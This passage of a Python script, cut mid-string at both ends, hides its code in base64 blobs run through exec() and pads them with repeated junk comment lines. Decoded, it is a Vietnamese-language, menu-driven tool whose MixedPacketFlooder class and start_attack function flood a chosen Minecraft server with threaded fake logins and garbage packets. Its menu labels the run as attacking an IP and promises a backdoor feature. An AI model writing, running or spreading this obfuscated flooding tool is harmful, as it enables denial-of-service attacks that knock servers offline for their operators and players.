AogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAg